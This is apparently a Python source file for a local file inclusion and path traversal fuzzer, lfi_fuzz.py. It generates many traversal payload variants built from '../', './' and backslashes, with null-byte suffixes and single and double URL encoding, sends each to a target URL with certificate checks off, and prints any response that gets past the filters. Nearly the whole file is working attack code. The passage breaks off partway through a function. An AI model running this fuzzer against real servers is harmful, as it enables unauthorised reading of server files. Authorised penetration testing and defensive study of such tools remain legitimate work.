import itertools
import requests
import getopt
import sys
import common
import urllib3


urllib3.disable_warnings()

DOT = "."
DDS = "../"
DS = "./"
SLASH = "/"
RSLASH = "\\"

def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p, --path=      \tdir or file")
    print("\t--depth=         \trecursion depth")
    print("\t--hcode=         \tHidden code separate [,]")
    print("\t--hsize=         \tHidden length content separate [,]")
    print("\t--htext=         \tHidden text separate [,]")
    print("\t-c, --cookie     \tset cookie separate [,]")
    print("EXAMPLES: ")    
    print("\tlfi_fuzz.py -u http://example.com -p test")
    print("\tlfi_fuzz.py --url=http://example.com --path=test")
    print("\tlfi_fuzz.py --url=http://example.com --path=test --hcode=404,502")
    print("\tlfi_fuzz.py --url=http://example.com --path=test --hsize=612")
    print("\tlfi_fuzz.py -u http://example.com -p test --cookie session=test,path=/")


def bypass_filter_lfi_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, depth=5):
    dds = DDS
    ds = DS
    slash = SLASH
    rslash = RSLASH
    dot = DOT
    for _ in range(depth):
        payloads_bypass = [f"{slash}{dds}{rslash}{payload}",
                            f"{rslash}{dds}{slash}{payload}",
                            f"{slash}{rslash}{dds}{payload}",
                            f"{rslash}{slash}{dds}{payload}",
                            f"{slash}{rslash}{dds}{slash}{payload}",
                            f"{rslash}{slash}{dds}{slash}{payload}",
                            f"{slash}{rslash}{dds}{rslash}{payload}",
                            f"{rslash}{slash}{dds}{rslash}{payload}",
                            f"{slash}{dds}{slash}{rslash}{payload}",
                            f"{slash}{dds}{rslash}{slash}{payload}",
                            f"{rslash}{dds}{slash}{rslash}{payload}",
                            f"{rslash}{dds}{rslash}{slash}{payload}",
                            f"{slash}{ds}{rslash}{payload}",
                            f"{rslash}{ds}{slash}{payload}",
                            f"{slash}{rslash}{ds}{payload}",
                            f"{rslash}{slash}{ds}{payload}",
                            f"{slash}{rslash}{ds}{slash}{payload}",
                            f"{rslash}{slash}{ds}{slash}{payload}",
                            f"{slash}{rslash}{ds}{rslash}{payload}",
                            f"{rslash}{slash}{ds}{rslash}{payload}",
                            f"{slash}{ds}{slash}{rslash}{payload}",
                            f"{slash}{ds}{rslash}{slash}{payload}",
                            f"{rslash}{ds}{slash}{rslash}{payload}",
                            f"{rslash}{ds}{rslash}{slash}{payload}",
                            f"{slash}{ds}{dds}{payload}",
                            f"{slash}{dds}{ds}{payload}",                    
                            f"{rslash}{ds}{dds}{payload}",
                            f"{rslash}{dds}{ds}{payload}",                    
                            f"{ds}{dds}{slash}{payload}",
                            f"{dds}{ds}{slash}{payload}",                    
                            f"{ds}{dds}{rslash}{payload}",
                            f"{dds}{ds}{rslash}{payload}",                    
                            f"{ds}{slash}{dds}{payload}",
                            f"{dds}{slash}{ds}{payload}",
                            f"{ds}{rslash}{dds}{payload}",
                            f"{dds}{rslash}{ds}{payload}",
                            f"{slash}{ds}{dds}{slash}{payload}",
                            f"{slash}{dds}{ds}{slash}{payload}",
                            f"{rslash}{ds}{dds}{rslash}{payload}",
                            f"{rslash}{dds}{ds}{rslash}{payload}",
                            f"{slash}{dds}{rslash}{payload}%00",
                            f"{rslash}{dds}{slash}{payload}%00",
                            f"{slash}{rslash}{dds}{payload}%00",
                            f"{rslash}{slash}{dds}{payload}%00",
                            f"{slash}{rslash}{dds}{slash}{payload}%00",
                            f"{rslash}{slash}{dds}{slash}{payload}%00",
                            f"{slash}{rslash}{dds}{rslash}{payload}%00",
                            f"{rslash}{slash}{dds}{rslash}{payload}%00",
                            f"{slash}{dds}{slash}{rslash}{payload}%00",
                            f"{slash}{dds}{rslash}{slash}{payload}%00",
                            f"{rslash}{dds}{slash}{rslash}{payload}%00",
                            f"{rslash}{dds}{rslash}{slash}{payload}%00",
                            f"{slash}{ds}{rslash}{payload}%00",
                            f"{rslash}{ds}{slash}{payload}%00",
                            f"{slash}{rslash}{ds}{payload}%00",
                            f"{rslash}{slash}{ds}{payload}%00",
                            f"{slash}{rslash}{ds}{slash}{payload}%00",
                            f"{rslash}{slash}{ds}{slash}{payload}%00",
                            f"{slash}{rslash}{ds}{rslash}{payload}%00",
                            f"{rslash}{slash}{ds}{rslash}{payload}%00",
                            f"{slash}{ds}{slash}{rslash}{payload}%00",
                            f"{slash}{ds}{rslash}{slash}{payload}%00",
                            f"{rslash}{ds}{slash}{rslash}{payload}%00",
                            f"{rslash}{ds}{rslash}{slash}{payload}%00",
                            f"{slash}{ds}{dds}{payload}%00",
                            f"{slash}{dds}{ds}{payload}%00",                    
                            f"{rslash}{ds}{dds}{payload}%00",
                            f"{rslash}{dds}{ds}{payload}%00",                    
                            f"{ds}{dds}{slash}{payload}%00",
                            f"{dds}{ds}{slash}{payload}%00",                    
                            f"{ds}{dds}{rslash}{payload}%00",
                            f"{dds}{ds}{rslash}{payload}%00",                    
                            f"{ds}{slash}{dds}{payload}%00",
                            f"{dds}{slash}{ds}{payload}%00",
                            f"{ds}{rslash}{dds}{payload}%00",
                            f"{dds}{rslash}{ds}{payload}%00",
                            f"{slash}{ds}{dds}{slash}{payload}%00",
                            f"{slash}{dds}{ds}{slash}{payload}%00",
                            f"{rslash}{ds}{dds}{rslash}{payload}%00",
                            f"{rslash}{dds}{ds}{rslash}{payload}%00"]
        for p in payloads_bypass:            
            resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))            
                
            # URLENCODE
            resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            	
            # DOUBLE URLENCODE
            resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        dds += DDS
        ds += DS
        slash += SLASH
        rslash += RSLASH

    dds = DDS
    for _ in range(depth):
        slash = SLASH
        for _ in range(depth):
            payloads_bypass = [f"{dds}{slash}{payload}",
                               f"{slash}{dds}{payload}",
                               f"{dds}{slash}{dds}{payload}",                               
                               f"{slash}{dds}{slash}{payload}",
                               f"{dds}{slash}{dds}{slash}{payload}",
                               f"{dds}{slash}{dds}{slash}{dds}{slash}{payload}",
                               f"{dds}{slash}{payload}%00",
                               f"{slash}{dds}{payload}%00",
                               f"{dds}{slash}{dds}{payload}%00",                               
                               f"{slash}{dds}{slash}{payload}%00",
                               f"{dds}{slash}{dds}{slash}{payload}%00",
                               f"{dds}{slash}{dds}{slash}{dds}{slash}{payload}%00"]
            for p in payloads_bypass:
                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            slash += SLASH
        dds += DDS
    dds = DDS
    for _ in range(depth):
        rslash = RSLASH
        for _ in range(depth):
            payloads_bypass = [f"{dds}{rslash}{payload}",
                               f"{rslash}{dds}{payload}",
                               f"{dds}{rslash}{dds}{payload}",                               
                               f"{rslash}{dds}{rslash}{payload}",
                               f"{dds}{rslash}{dds}{rslash}{payload}",
                               f"{dds}{rslash}{dds}{rslash}{dds}{rslash}{payload}",
                               f"{dds}{rslash}{payload}%00",
                               f"{rslash}{dds}{payload}%00",
                               f"{dds}{rslash}{dds}{payload}%00",                               
                               f"{rslash}{dds}{rslash}{payload}%00",
                               f"{dds}{rslash}{dds}{rslash}{payload}%00",
                               f"{dds}{rslash}{dds}{rslash}{dds}{rslash}{payload}%00"]
            for p in payloads_bypass:
                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            rslash += RSLASH
        dds += DDS

    ds = DS
    for _ in range(depth):
        slash = SLASH
        for _ in range(depth):
            payloads_bypass = [f"{ds}{slash}{payload}",
                               f"{slash}{ds}{payload}",
                               f"{ds}{slash}{ds}{payload}",                               
                               f"{slash}{ds}{slash}{payload}",
                               f"{ds}{slash}{ds}{slash}{payload}",
                               f"{ds}{slash}{ds}{slash}{ds}{slash}{payload}",
                               f"{ds}{slash}{payload}%00",
                               f"{slash}{ds}{payload}%00",
                               f"{ds}{slash}{ds}{payload}%00",                               
                               f"{slash}{ds}{slash}{payload}%00",
                               f"{ds}{slash}{ds}{slash}{payload}%00",
                               f"{ds}{slash}{ds}{slash}{ds}{slash}{payload}%00"]
            for p in payloads_bypass:
                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            slash += SLASH
        ds += DS

    ds = DS
    for _ in range(depth):
        rslash = RSLASH
        for _ in range(depth):
            payloads_bypass = [f"{ds}{rslash}{payload}",
                               f"{rslash}{ds}{payload}",
                               f"{ds}{rslash}{ds}{payload}",                               
                               f"{rslash}{ds}{rslash}{payload}",
                               f"{ds}{rslash}{ds}{rslash}{payload}",
                               f"{ds}{rslash}{ds}{rslash}{ds}{rslash}{payload}",
                               f"{ds}{rslash}{payload}%00",
                               f"{rslash}{ds}{payload}%00",
                               f"{ds}{rslash}{ds}{payload}%00",                               
                               f"{rslash}{ds}{rslash}{payload}%00",
                               f"{ds}{rslash}{ds}{rslash}{payload}%00",
                               f"{ds}{rslash}{ds}{rslash}{ds}{rslash}{payload}%00"]
            for p in payloads_bypass:
                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            rslash += RSLASH
        ds += DS

    
      
def lfi_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, depth=5):
    dds = DDS
    ds = DS
    for _ in range(depth):
        payloads_one = [f"{dds}",
                        f"{ds}",
                        f"{dds}{payload}",
                        f"{payload}{dds}",
                        f"{ds}{payload}",
                        f"{payload}{ds}",
                        f"{dds}{payload}{dds}",
                        f"{ds}{payload}{ds}",
                        f"{dds}{ds}{payload}",
                        f"{ds}{dds}{payload}",
                        f"{payload}{dds}{ds}",
                        f"{payload}{ds}{dds}",
                        f"{dds}{payload}/",
                        f"{ds}{payload}/",
                        f"{payload}/{dds}",                    
                        f"{payload}/{ds}",
                        f"{dds}{payload}/{dds}",
                        f"{ds}{payload}/{ds}",
                        f"{dds}{ds}{payload}/",
                        f"{ds}{dds}{payload}/",
                        f"{payload}/{dds}{ds}",
                        f"{payload}/{ds}{dds}",
                        f"{dds}{payload}%00",
                        f"{payload}{dds}%00",
                        f"{ds}{payload}%00",
                        f"{payload}{ds}%00",
                        f"{dds}{payload}{dds}%00",
                        f"{ds}{payload}{ds}%00",
                        f"{dds}{ds}{payload}%00",
                        f"{ds}{dds}{payload}%00",
                        f"{payload}{dds}{ds}%00",
                        f"{payload}{ds}{dds}%00",
                        f"{dds}{payload}/%00",
                        f"{ds}{payload}/%00",
                        f"{payload}/{dds}%00",                    
                        f"{payload}/{ds}%00",
                        f"{dds}{payload}/{dds}%00",
                        f"{ds}{payload}/{ds}%00",
                        f"{dds}{ds}{payload}/%00",
                        f"{ds}{dds}{payload}/%00",
                        f"{payload}/{dds}{ds}%00",
                        f"{payload}/{ds}{dds}%00"]
        for p in payloads_one:
            resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                
            # URLENCODE
            resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            	
            # DOUBLE URLENCODE
            resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
            	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        dds += DDS
        ds += DS

    ds = DS
    for _ in range(depth):
        dds = DDS
        for _ in range(depth):
            payloads_two = [f"{ds}{payload}{dds}",
                            f"{dds}{payload}{ds}",                                                        
                            f"{dds}{ds}{payload}{ds}",
                            f"{ds}{dds}{payload}{ds}",
                            f"{dds}{ds}{payload}{dds}",
                            f"{ds}{dds}{payload}{dds}",
                            f"{ds}{payload}/{dds}",
                            f"{dds}{payload}/{ds}",                                                        
                            f"{dds}{ds}{payload}/{ds}",
                            f"{ds}{dds}{payload}/{ds}",
                            f"{dds}{ds}{payload}/{dds}",
                            f"{ds}{dds}{payload}/{dds}",
                            f"{ds}{payload}{dds}%00",
                            f"{dds}{payload}{ds}%00",                                                        
                            f"{dds}{ds}{payload}{ds}%00",
                            f"{ds}{dds}{payload}{ds}%00",
                            f"{dds}{ds}{payload}{dds}%00",
                            f"{ds}{dds}{payload}{dds}%00",
                            f"{ds}{payload}/{dds}%00",
                            f"{dds}{payload}/{ds}%00",                                                        
                            f"{dds}{ds}{payload}/{ds}%00",
                            f"{ds}{dds}{payload}/{ds}%00",
                            f"{dds}{ds}{payload}/{dds}%00",
                            f"{ds}{dds}{payload}/{dds}%00"]
            for p in payloads_two:                
                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                    print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
